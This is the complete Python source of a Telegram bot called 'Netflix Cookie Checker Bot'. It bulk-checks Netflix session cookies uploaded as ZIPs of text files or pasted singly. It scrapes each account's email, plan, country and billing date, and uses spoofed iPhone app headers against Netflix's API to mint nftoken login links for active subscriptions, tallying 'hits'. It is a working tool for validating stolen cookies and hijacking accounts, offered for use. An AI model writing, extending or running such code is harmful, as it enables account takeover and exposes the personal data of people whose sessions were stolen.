import os
import sys
import re
import json
import zipfile
import tempfile
import shutil
import requests
import urllib.parse
from datetime import datetime
from threading import Lock
import time
import gc
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# ============ PORT FIX FOR RENDER ============
PORT = int(os.environ.get("PORT", 10000))
print(f"✅ Server will run on port {PORT}")

# ============ KEEP ALIVE SERVER ============
try:
    from http.server import HTTPServer, BaseHTTPRequestHandler
    import threading

    class KeepAliveHandler(BaseHTTPRequestHandler):
        def do_GET(self):
            self.send_response(200)
            self.end_headers()
            self.wfile.write(b"Bot is running!")
        def log_message(self, format, *args):
            pass

    def run_keep_alive():
        try:
            port = int(os.environ.get("PORT", 10000))
            server = HTTPServer(("0.0.0.0", port), KeepAliveHandler)
            server.serve_forever()
        except:
            pass

    keep_alive_thread = threading.Thread(target=run_keep_alive, daemon=True)
    keep_alive_thread.start()
    print("✅ Keep-alive server started")
except Exception as e:
    print(f"⚠️ Keep-alive not started: {e}")

# ============ TELEGRAM IMPORTS ============
try:
    from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
    from telegram.ext import Application, CommandHandler, MessageHandler, filters, CallbackQueryHandler, ContextTypes
except Exception as e:
    print(f"❌ Telegram import error: {e}")
    sys.exit(1)

# ============ NETFLIX CONFIGURATION ============
API_URL = "https://ios.prod.ftl.netflix.com/iosui/user/15.48"

QUERY_PARAMS = {
    "appVersion": "15.48.1",
    "config": '{"gamesInTrailersEnabled":"false","isTrailersEvidenceEnabled":"false","cdsMyListSortEnabled":"true","kidsBillboardEnabled":"true","addHorizontalBoxArtToVideoSummariesEnabled":"false","skOverlayTestEnabled":"false","homeFeedTestTVMovieListsEnabled":"false","baselineOnIpadEnabled":"true","trailersVideoIdLoggingFixEnabled":"true","postPlayPreviewsEnabled":"false","bypassContextualAssetsEnabled":"false","roarEnabled":"false","useSeason1AltLabelEnabled":"false","disableCDSSearchPaginationSectionKinds":["searchVideoCarousel"],"cdsSearchHorizontalPaginationEnabled":"true","searchPreQueryGamesEnabled":"true","kidsMyListEnabled":"true","billboardEnabled":"true","useCDSGalleryEnabled":"true","contentWarningEnabled":"true","videosInPopularGamesEnabled":"true","avifFormatEnabled":"false","sharksEnabled":"true"}',
    "device_type": "NFAPPL-02-",
    "esn": "NFAPPL-02-IPHONE8%3D1-PXA-02026U9VV5O8AUKEAEO8PUJETCGDD4PQRI9DEB3MDLEMD0EACM4CS78LMD334MN3MQ3NMJ8SU9O9MVGS6BJCURM1PH1MUTGDPF4S4200",
    "idiom": "phone",
    "iosVersion": "15.8.5",
    "isTablet": "false",
    "languages": "en-US",
    "locale": "en-US",
    "maxDeviceWidth": "375",
    "model": "saget",
    "modelType": "IPHONE8-1",
    "odpAware": "true",
    "path": '["account","token","default"]',
    "pathFormat": "graph",
    "pixelDensity": "2.0",
    "progressive": "false",
    "responseFormat": "json",
}

BASE_HEADERS = {
    "User-Agent": "Argo/15.48.1 (iPhone; iOS 15.8.5; Scale/2.00)",
    "x-netflix.request.attempt": "1",
    "x-netflix.request.client.user.guid": "A4CS633D7VCBPE2GPK2HL4EKOE",
    "x-netflix.context.profile-guid": "A4CS633D7VCBPE2GPK2HL4EKOE",
    "x-netflix.request.routing": '{"path":"/nq/mobile/nqios/~15.48.0/user","control_tag":"iosui_argo"}',
    "x-netflix.context.app-version": "15.48.1",
    "x-netflix.argo.translated": "true",
    "x-netflix.context.form-factor": "phone",
    "x-netflix.context.sdk-version": "2012.4",
    "x-netflix.client.appversion": "15.48.1",
    "x-netflix.context.max-device-width": "375",
    "x-netflix.context.ab-tests": "",
    "x-netflix.tracing.cl.useractionid": "4DC655F2-9C3C-4343-8229-CA1B003C3053",
    "x-netflix.client.type": "argo",
    "x-netflix.client.ftl.esn": "NFAPPL-02-IPHONE8=1-PXA-02026U9VV5O8AUKEAEO8PUJETCGDD4PQRI9DEB3MDLEMD0EACM4CS78LMD334MN3MQ3NMJ8SU9O9MVGS6BJCURM1PH1MUTGDPF4S4200",
    "x-netflix.context.locales": "en-US",
    "x-netflix.context.top-level-uuid": "90AFE39F-ADF1-4D8A-B33E-528730990FE3",
    "x-netflix.client.iosversion": "15.8.5",
    "accept-language": "en-US;q=1",
    "x-netflix.argo.abtests": "",
    "x-netflix.context.os-version": "15.8.5",
    "x-netflix.request.client.context": '{"appState":"foreground"}',
    "x-netflix.context.ui-flavor": "argo",
    "x-netflix.argo.nfnsm": "9",
    "x-netflix.context.pixel-density": "2.0",
    "x-netflix.request.toplevel.uuid": "90AFE39F-ADF1-4D8A-B33E-528730990FE3",
    "x-netflix.request.client.timezoneid": "Asia/Dhaka",
}

COOKIE_KEYS = ("NetflixId", "SecureNetflixId", "nfvdid", "OptanonConsent")
REQUIRED_COOKIE = "NetflixId"

# ============ BOT CONFIGURATION ============
BOT_TOKEN = os.environ.get("BOT_TOKEN", "YOUR_BOT_TOKEN_HERE")
if BOT_TOKEN == "YOUR_BOT_TOKEN_HERE":
    print("❌ Please set BOT_TOKEN environment variable!")
    sys.exit(1)

MAX_FILE_SIZE = 5 * 1024 * 1024
MAX_FILES = 50
BATCH_SIZE = 10

# ============ COUNTERS ============
class Counters:
    def __init__(self):
        self.hit = 0
        self.bad = 0
        self.lock = Lock()
    
    def get_stats(self):
        with self.lock:
            return f"HIT: {self.hit} | BAD: {self.bad}"
    
    def add_hit(self):
        with self.lock:
            self.hit += 1
    
    def add_bad(self):
        with self.lock:
            self.bad += 1
    
    def reset(self):
        with self.lock:
            self.hit = 0
            self.bad = 0

counters = Counters()

# ============ COOKIE FUNCTIONS ============
def parse_netscape_cookie_line(line):
    parts = line.strip().split("\t")
    if len(parts) >= 7:
        return {parts[5]: parts[6]}
    return {}

def decode_cookie_value(value):
    if isinstance(value, str) and "%" in value:
        try:
            return urllib.parse.unquote(value)
        except Exception:
            return value
    return value

def fix_email_display(email):
    if not email or email == "Unknown":
        return email
    return email.replace('\\x40', '@').replace('%40', '@')

def extract_cookie_dict(text):
    cookie_dict = {}
    for raw_line in text.splitlines():
        line = raw_line.strip()
        if not line or line.startswith("#"):
            continue
        cookie_dict.update(parse_netscape_cookie_line(line))
    try:
        data = json.loads(text)
        if isinstance(data, list):
            for cookie in data:
                name = cookie.get("name")
                value = cookie.get("value")
                if name in COOKIE_KEYS and isinstance(value, str):
                    cookie_dict[name] = decode_cookie_value(value)
        elif isinstance(data, dict):
            if any(key in data for key in COOKIE_KEYS):
                for key in COOKIE_KEYS:
                    value = data.get(key)
                    if isinstance(value, str):
                        cookie_dict[key] = decode_cookie_value(value)
            elif isinstance(data.get("cookies"), list):
                for cookie in data["cookies"]:
                    name = cookie.get("name")
                    value = cookie.get("value")
                    if name in COOKIE_KEYS and isinstance(value, str):
                        cookie_dict[name] = decode_cookie_value(value)
    except:
        pass
    for key in COOKIE_KEYS:
        if key in cookie_dict:
            continue
        match = re.search(rf"(?<!\w){re.escape(key)}=([^;,\s]+)", text)
        if match:
            cookie_dict[key] = decode_cookie_value(match.group(1))
    return cookie_dict

def extract_cookies_from_file(file_path):
    try:
        with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
            content = f.read()
        return extract_cookie_dict(content)
    except Exception:
        return {}

def extract_cookies_from_text(text):
    return extract_cookie_dict(text)

def get_account_info(cookie_dict):
    netflix_id = cookie_dict.get(REQUIRED_COOKIE)
    if not netflix_id:
        return None
    url = "https://www.netflix.com/account"
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:124.0) Gecko/20100101 Firefox/124.0",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.5",
        "Connection": "close",
    }
    cookies = {"NetflixId": netflix_id}
    try:
        response = requests.get(url, headers=headers, cookies=cookies, timeout=10, verify=False)
        text = response.text
        response.close()
        
        info = {
            "status": "Unknown",
            "email": "Unknown",
            "country": "Unknown",
            "plan": "Unknown",
            "maxStreams": "Unknown",
            "memberSince": "Unknown",
            "nextBilling": "Unknown",
        }
        
        status_match = re.search(r'"membershipStatus":"(\w+)"', text)
        if status_match:
            status = status_match.group(1)
            if status == "CURRENT_MEMBER":
                info["status"] = "Active"
            elif status == "FORMER_MEMBER":
                info["status"] = "Canceled"
            elif status == "NEVER_MEMBER":
                info["status"] = "Free"
            else:
                info["status"] = status
        
        email_match = re.search(r'"profileEmailAddress":"([^"]+)"', text)
        if not email_match:
            email_match = re.search(r'"emailAddress":"([^"]+)"', text)
        if email_match:
            info["email"] = fix_email_display(email_match.group(1))
        
        country_match = re.search(r'"currentCountry":"([^"]+)"', text)
        if country_match:
            info["country"] = country_match.group(1)
        
        plan_match = re.search(r'"localizedPlanName":\{"fieldType":"String","value":"([^"]+)"', text)
        if not plan_match:
            plan_match = re.search(r'"localizedPlanName":"([^"]+)"', text)
        if plan_match:
            info["plan"] = plan_match.group(1)
        
        streams_match = re.search(r'"maxStreams":\{"fieldType":"Numeric","value":(\d+)', text)
        if streams_match:
            info["maxStreams"] = streams_match.group(1)
        
        since_match = re.search(r'"memberSince":"([^"]+)"', text)
        if since_match:
            info["memberSince"] = since_match.group(1)
        
        billing_match = re.search(r'"nextBillingDate":\{"fieldType":"String","value":"([^"]+)"', text)
        if billing_match:
            info["nextBilling"] = billing_match.group(1)
        
        return info
    except Exception:
        return None

def get_nftoken_from_cookies(cookie_dict):
    netflix_id = cookie_dict.get(REQUIRED_COOKIE)
    if not netflix_id:
        return None, None
    headers = dict(BASE_HEADERS)
    headers["Cookie"] = f"NetflixId={netflix_id}"
    headers["Connection"] = "close"
    try:
        response = requests.get(API_URL, params=QUERY_PARAMS, headers=headers, timeout=10, verify=False)
        response.raise_for_status()
        data = response.json()
        response.close()
        token_data = (((data.get("value") or {}).get("account") or {}).get("token") or {}).get("default") or {}
        token = token_data.get("token")
        expires = token_data.get("expires")
        if not token:
            return None, None
        if isinstance(expires, int) and len(str(expires)) == 13:
            expires //= 1000
        return token, expires
    except Exception:
        return None, None

def format_expiry(expires):
    if not isinstance(expires, (int, float)):
        return "Unknown"
    try:
        return datetime.fromtimestamp(expires).strftime("%Y-%m-%d %H:%M:%S")
    except Exception:
        return str(expires)

def classify_plan(plan_name):
    if not plan_name:
        return "Unknown"
    plan_lower = plan_name.lower()
    basic_keywords = ["basic", "dasar", "asas", "basis", "básico", "essentiel", "base"]
    standard_keywords = ["standard", "standar", "standart", "estándar", "padrão"]
    premium_keywords = ["premium", "prémium", "perhe"]
    mobile_keywords = ["mobile", "telefon", "celular"]
    
    for kw in mobile_keywords:
        if kw in plan_lower:
            return "Mobile"
    for kw in basic_keywords:
        if kw in plan_lower:
            return "Basic"
    for kw in standard_keywords:
        if kw in plan_lower:
            return "Standard"
    for kw in premium_keywords:
        if kw in plan_lower:
            return "Premium"
    
    return plan_name

def is_valid_cookie(cookie_dict):
    return REQUIRED_COOKIE in cookie_dict

def process_single_cookie_file(file_path):
    try:
        cookie_dict = extract_cookies_from_file(file_path)
        if not is_valid_cookie(cookie_dict):
            return None, None
        
        account_info = get_account_info(cookie_dict)
        if not account_info or account_info["status"] != "Active":
            return None, None
        
        account_info["email"] = fix_email_display(account_info["email"])
        token, expires = get_nftoken_from_cookies(cookie_dict)
        if not token:
            return None, None
        
        time_left_str = "Unknown"
        if expires:
            try:
                expiry_dt = datetime.fromtimestamp(expires)
                time_now = datetime.now()
                time_left = expiry_dt - time_now
                if time_left.total_seconds() > 0:
                    days = time_left.days
                    hours = time_left.seconds // 3600
                    minutes = (time_left.seconds % 3600) // 60
                    time_left_str = f"{days}d {hours}h {minutes}m"
                else:
                    time_left_str = "EXPIRED"
            except:
                pass
        
        plan_type = classify_plan(account_info["plan"])
        if plan_type not in ["Premium", "Standard", "Basic", "Mobile"]:
            return None, None
        
        result = {
            "email": account_info["email"],
            "plan": account_info["plan"],
            "plan_type": plan_type,
            "country": account_info["country"],
            "memberSince": account_info["memberSince"],
            "nextBilling": account_info["nextBilling"],
            "maxStreams": account_info["maxStreams"],
            "nftoken": token,
            "expires": expires,
            "expiry_formatted": format_expiry(expires),
            "pc_link": f"https://www.netflix.com/browse?nftoken={token}",
            "phone_link": f"https://www.netflix.com/unsupported?nftoken={token}",
            "time_left": time_left_str
        }
        
        return result, cookie_dict
    except Exception as e:
        return None, None

def process_single_cookie_text(text):
    try:
        cookie_dict = extract_cookies_from_text(text)
        if not is_valid_cookie(cookie_dict):
            return None, None
        
        account_info = get_account_info(cookie_dict)
        if not account_info or account_info["status"] != "Active":
            return None, None
        
        account_info["email"] = fix_email_display(account_info["email"])
        token, expires = get_nftoken_from_cookies(cookie_dict)
        if not token:
            return None, None
        
        time_left_str = "Unknown"
        if expires:
            try:
                expiry_dt = datetime.fromtimestamp(expires)
                time_now = datetime.now()
                time_left = expiry_dt - time_now
                if time_left.total_seconds() > 0:
                    days = time_left.days
                    hours = time_left.seconds // 3600
                    minutes = (time_left.seconds % 3600) // 60
                    time_left_str = f"{days}d {hours}h {minutes}m"
                else:
                    time_left_str = "EXPIRED"
            except:
                pass
        
        plan_type = classify_plan(account_info["plan"])
        if plan_type not in ["Premium", "Standard", "Basic", "Mobile"]:
            return None, None
        
        result = {
            "email": account_info["email"],
            "plan": account_info["plan"],
            "plan_type": plan_type,
            "country": account_info["country"],
            "memberSince": account_info["memberSince"],
            "nextBilling": account_info["nextBilling"],
            "maxStreams": account_info["maxStreams"],
            "nftoken": token,
            "expires": expires,
            "expiry_formatted": format_expiry(expires),
            "pc_link": f"https://www.netflix.com/browse?nftoken={token}",
            "phone_link": f"https://www.netflix.com/unsupported?nftoken={token}",
            "time_left": time_left_str
        }
        
        return result, cookie_dict
    except Exception as e:
        return None, None

# ============ FILE FUNCTIONS ============
def extract_zip(file_path, extract_path):
    try:
        with zipfile.ZipFile(file_path, 'r') as zip_ref:
            zip_ref.extractall(extract_path)
        return True, None
    except zipfile.BadZipFile:
        return False, "Corrupted ZIP file"
    except Exception as e:
        return False, f"Extraction error: {str(e)}"

def find_txt_files(folder_path):
    txt_files = []
    try:
        for root, dirs, files in os.walk(folder_path):
            for file in files:
                if file.lower().endswith('.txt'):
                    txt_files.append(os.path.join(root, file))
    except Exception:
        pass
    return txt_files

# ============ TELEGRAM HANDLERS ============
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    keyboard = [
        [InlineKeyboardButton("📦 Bulk Check (ZIP)", callback_data="bulk")],
        [InlineKeyboardButton("📝 Single Check (Cookie)", callback_data="single")],
        [InlineKeyboardButton("📖 How to Use", callback_data="help")],
        [InlineKeyboardButton("📊 Stats", callback_data="stats")],
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    await update.message.reply_text(
        f"🎬 **Netflix Cookie Checker Bot**\n\n"
        f"Choose an option below:\n\n"
        f"📦 **Bulk Check** - Upload a ZIP file (max 5MB, max 50 files)\n"
        f"📝 **Single Check** - Paste your cookie manually\n\n"
        f"⚡ All valid accounts will be converted to NFTokens.\n"
        f"💎 Only Premium, Standard, Basic, Mobile plans are shown.",
        reply_markup=reply_markup,
        parse_mode="Markdown"
    )

async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    help_text = (
        "📖 **How to Use**\n\n"
        "📦 **Bulk Mode:**\n"
        "1️⃣ Collect Netflix cookies in TXT files\n"
        "2️⃣ Put all files in one folder (max 50 files)\n"
        "3️⃣ Compress folder as ZIP (max 5MB)\n"
        "4️⃣ Send the ZIP file to the bot\n\n"
        "📝 **Single Mode:**\n"
        "1️⃣ Click 'Single Check'\n"
        "2️⃣ Paste your cookie text\n"
        "3️⃣ Bot will verify and show NFToken links\n\n"
        "📂 **Required Cookie Format:**\n"
        "• Netscape format or JSON\n"
        "• Must contain: NetflixId\n\n"
        "💎 **Supported Plans:**\n"
        "• Premium, Standard, Basic, Mobile"
    )
    
    keyboard = [[InlineKeyboardButton("🔙 Back", callback_data="back")]]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    if update.callback_query:
        await update.callback_query.edit_message_text(help_text, reply_markup=reply_markup, parse_mode="Markdown")
    else:
        await update.message.reply_text(help_text, reply_markup=reply_markup, parse_mode="Markdown")

async def about_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    about_text = (
        "ℹ️ **About Bot**\n\n"
        "Netflix Cookie Checker Bot\n"
        "Checks Netflix cookies and converts to NFTokens.\n\n"
        "🔹 Version: 13.0 (NFToken Converter)\n"
        "🔹 Bulk: ZIP up to 5MB, 50 files max\n"
        "🔹 Single: Manual cookie paste\n"
        "🔹 Shows: Premium, Standard, Basic, Mobile\n"
        "🔹 Output: PC Link + Phone Link"
    )
    
    keyboard = [[InlineKeyboardButton("🔙 Back", callback_data="back")]]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    if update.callback_query:
        await update.callback_query.edit_message_text(about_text, reply_markup=reply_markup, parse_mode="Markdown")
    else:
        await update.message.reply_text(about_text, reply_markup=reply_markup, parse_mode="Markdown")

async def stats_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    stats_text = f"📊 **Current Statistics**\n\n{counters.get_stats()}\n\n🔄 Use /resetstats to reset counters"
    keyboard = [
        [InlineKeyboardButton("🔄 Reset Stats", callback_data="reset_stats")],
        [InlineKeyboardButton("🔙 Back", callback_data="back")],
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    if update.callback_query:
        await update.callback_query.edit_message_text(stats_text, reply_markup=reply_markup, parse_mode="Markdown")
    else:
        await update.message.reply_text(stats_text, reply_markup=reply_markup, parse_mode="Markdown")

async def reset_stats_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    counters.reset()
    if update.callback_query:
        await update.callback_query.answer("📊 Statistics reset!", show_alert=True)
        await stats_command(update, context)
    else:
        await update.message.reply_text("📊 Statistics reset!")

async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    if query.data == "bulk":
        await query.edit_message_text(
            "📦 **Bulk Mode**\n\n"
            "Send me a ZIP file containing TXT files with Netflix cookies.\n\n"
            "⚠️ **Limits:**\n"
            "• Max file size: 5 MB\n"
            "• Max files: 50\n\n"
            "📎 I will check each file and show only valid accounts.\n"
            "💎 Premium, Standard, Basic, Mobile only.",
            parse_mode="Markdown"
        )
        context.user_data['mode'] = 'bulk'
    
    elif query.data == "single":
        await query.edit_message_text(
            "📝 **Single Mode**\n\n"
            "Send me your cookie text in one of these formats:\n\n"
            "**Netscape Format:**\n"
            "`.netflix.com\tTRUE\t/\tFALSE\t...\tNetflixId\tvalue`\n\n"
            "**JSON Format:**\n"
            "`{\"NetflixId\": \"value\"}`\n\n"
            "**Direct Format:**\n"
            "`NetflixId=value`\n\n"
            "📎 Just paste your cookie and I'll verify it.",
            parse_mode="Markdown"
        )
        context.user_data['mode'] = 'single'
    
    elif query.data == "help":
        await help_command(update, context)
    
    elif query.data == "about":
        await about_command(update, context)
    
    elif query.data == "stats":
        await stats_command(update, context)
    
    elif query.data == "reset_stats":
        await reset_stats_command(update, context)
    
    elif query.data == "back":
        keyboard = [
            [InlineKeyboardButton("📦 Bulk Check (ZIP)", callback_data="bulk")],
            [InlineKeyboardButton("📝 Single Check (Cookie)", callback_data="single")],
            [InlineKeyboardButton("📖 How to Use", callback_data="help")],
            [InlineKeyboardButton("📊 Stats", callback_data="stats")],
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        await query.edit_message_text(
            f"🎬 **Netflix Cookie Checker Bot**\n\n"
            f"Choose an option below:\n\n"
            f"📦 **Bulk Check** - Upload a ZIP file (max 5MB, max 50 files)\n"
            f"📝 **Single Check** - Paste your cookie manually\n\n"
            f"⚡ All valid accounts will be converted to NFTokens.\n"
            f"💎 Only Premium, Standard, Basic, Mobile plans are shown.",
            reply_markup=reply_markup,
            parse_mode="Markdown"
        )

# ============ SEND ACCOUNT MESSAGE ============
async def send_account_message(update, context, result, index=None, total=None):
    plan_emoji = "🟣" if result["plan_type"] == "Premium" else "🔵" if result["plan_type"] == "Standard" else "🟢" if result["plan_type"] == "Basic" else "📱"
    
    header = f"🎬 **Netflix Hit**" if not index else f"🎬 **Netflix Hit #{index}/{total}**"
    
    message = f"{header}\n\n"
    message += f"📧 **Email:** `{result['email']}`\n"
    message += f"💎 **Plan:** {result['plan_type']}\n"
    message += f"🌍 **Country:** {result['country']}\n"
    message += f"⏳ **Member Since:** {result['memberSince']}\n"
    message += f"📅 **Next Bill:** {result['nextBilling']}\n"
    message += f"⏱️ **Expires:** {result['expiry_formatted']}\n"
    message += f"⏳ **Time Left:** {result.get('time_left', 'Unknown')}\n\n"
    message += "🔑 **NFToken Links:**"
    
    keyboard = [
        [InlineKeyboardButton("💻 PC Link", url=result['pc_link'])],
        [InlineKeyboardButton("📱 Phone Link", url=result['phone_link'])],
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    await update.message.reply_text(
        message,
        reply_markup=reply_markup,
        parse_mode="Markdown"
    )

# ============ BULK HANDLER ============
async def handle_bulk_document(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        document = update.message.document
        
        if document.file_size > MAX_FILE_SIZE:
            await update.message.reply_text(
                f"❌ **File too large!**\n\nMax: 5 MB\nYour file: {document.file_size / (1024*1024):.2f} MB",
                parse_mode="Markdown"
            )
            return
        
        file_name = document.file_name or ""
        if not file_name.lower().endswith('.zip'):
            await update.message.reply_text(
                "❌ **Unsupported file format!**\n\nPlease send ZIP files only.",
                parse_mode="Markdown"
            )
            return
        
        status_msg = await update.message.reply_text(
            "⏳ **Downloading and extracting your file...**",
            parse_mode="Markdown"
        )
        
        temp_dir = tempfile.mkdtemp()
        extract_dir = os.path.join(temp_dir, "extracted")
        os.makedirs(extract_dir, exist_ok=True)
        
        file_path = os.path.join(temp_dir, file_name)
        file = await context.bot.get_file(document.file_id)
        await file.download_to_drive(file_path)
        
        success, error_msg = extract_zip(file_path, extract_dir)
        if not success:
            await status_msg.edit_text(f"❌ **Failed to extract!**\n\n{error_msg}", parse_mode="Markdown")
            shutil.rmtree(temp_dir)
            return
        
        txt_files = find_txt_files(extract_dir)
        if not txt_files:
            await status_msg.edit_text("❌ **No TXT files found!**", parse_mode="Markdown")
            shutil.rmtree(temp_dir)
            return
        
        if len(txt_files) > MAX_FILES:
            await status_msg.edit_text(
                f"❌ **Too many files!**\n\nMax: {MAX_FILES} files\nYour file: {len(txt_files)} files",
                parse_mode="Markdown"
            )
            shutil.rmtree(temp_dir)
            return
        
        total_files = len(txt_files)
        results = []
        processed = 0
        
        await status_msg.edit_text(
            f"📂 **Found {total_files} TXT files**\n\n"
            f"⏳ Checking cookies...",
            parse_mode="Markdown"
        )
        
        for txt_file in txt_files:
            try:
                processed += 1
                result, _ = process_single_cookie_file(txt_file)
                
                if result:
                    results.append(result)
                    counters.add_hit()
                else:
                    counters.add_bad()
                
                if processed % 5 == 0 or processed == total_files:
                    await status_msg.edit_text(
                        f"⏳ **Checking cookies...**\n\n"
                        f"📁 {processed}/{total_files} files checked\n"
                        f"📊 {counters.get_stats()}",
                        parse_mode="Markdown"
                    )
                
                gc.collect()
                
            except Exception as e:
                counters.add_bad()
                continue
        
        await status_msg.delete()
        
        if not results:
            await update.message.reply_text(
                f"❌ **No valid accounts found!**\n\n"
                f"📁 Files checked: {total_files}\n"
                f"📊 {counters.get_stats()}\n\n"
                f"💎 Only Premium, Standard, Basic, Mobile plans are shown.",
                parse_mode="Markdown"
            )
        else:
            for i, result in enumerate(results, 1):
                await send_account_message(update, context, result, i, len(results))
            
            await update.message.reply_text(
                f"✅ **Scan Complete!**\n\n"
                f"📊 Valid accounts found: {len(results)}\n"
                f"📁 Files checked: {total_files}\n"
                f"📊 {counters.get_stats()}",
                parse_mode="Markdown"
            )
        
        try:
            shutil.rmtree(temp_dir)
        except:
            pass
        
    except Exception as e:
        await update.message.reply_text(f"❌ **Error:** {str(e)}", parse_mode="Markdown")

# ============ SINGLE HANDLER ============
async def handle_single_text(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        text = update.message.text
        
        if not text or len(text) < 10:
            await update.message.reply_text(
                "❌ **Invalid cookie!**\n\nPlease send a valid cookie text.\n\n"
                "Format: `NetflixId=value` or Netscape format.",
                parse_mode="Markdown"
            )
            return
        
        status_msg = await update.message.reply_text(
            "⏳ **Verifying your cookie...**",
            parse_mode="Markdown"
        )
        
        result, cookie_dict = process_single_cookie_text(text)
        
        await status_msg.delete()
        
        if not result:
            await update.message.reply_text(
                "❌ **Cookie NOT Valid!**\n\n"
                "The cookie you provided is not valid or does not have an active subscription.\n\n"
                "💎 Only Premium, Standard, Basic, Mobile plans are accepted.",
                parse_mode="Markdown"
            )
            counters.add_bad()
            return
        
        counters.add_hit()
        await send_account_message(update, context, result)
        
    except Exception as e:
        await update.message.reply_text(f"❌ **Error:** {str(e)}", parse_mode="Markdown")

# ============ MAIN HANDLER ============
async def handle_document(update: Update, context: ContextTypes.DEFAULT_TYPE):
    mode = context.user_data.get('mode', 'bulk')
    
    if mode == 'single':
        await update.message.reply_text(
            "❌ **Please use the Single mode correctly.**\n\n"
            "Click 'Single Check' button first, then paste your cookie.",
            parse_mode="Markdown"
        )
        return
    
    await handle_bulk_document(update, context)

async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    mode = context.user_data.get('mode', 'bulk')
    
    if mode == 'single':
        await handle_single_text(update, context)
    else:
        await update.message.reply_text(
            "📦 **Bulk Mode**\n\nPlease send a ZIP file containing TXT files with cookies.\n\n"
            "Or click 'Single Check' for manual cookie entry.",
            parse_mode="Markdown"
        )

async def error_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    print(f"Error: {context.error}")

# ============ MAIN ============
def main():
    try:
        application = Application.builder().token(BOT_TOKEN).build()
        
        application.add_handler(CommandHandler("start", start))
        application.add_handler(CommandHandler("help", help_command))
        application.add_handler(CommandHandler("about", about_command))
        application.add_handler(CommandHandler("stats", stats_command))
        application.add_handler(CommandHandler("resetstats", reset_stats_command))
        application.add_handler(CallbackQueryHandler(button_callback, pattern="^(bulk|single|help|about|back|stats|reset_stats)$"))
        application.add_handler(MessageHandler(filters.Document.ALL, handle_document))
        application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))
        application.add_error_handler(error_handler)
        
        print("🤖 Netflix Cookie Checker Bot is running...")
        print("✅ Bulk: ZIP up to 5MB, 50 files max")
        print("✅ Single: Manual cookie paste")
        print("💎 Shows: Premium, Standard, Basic, Mobile")
        print("🔑 NFToken: PC Link + Phone Link")
        print("🌐 Keep-alive server running")
        
        application.run_polling(allowed_updates=Update.ALL_TYPES)
        
    except Exception as e:
        print(f"Error: {e}")

if __name__ == "__main__":
    main()
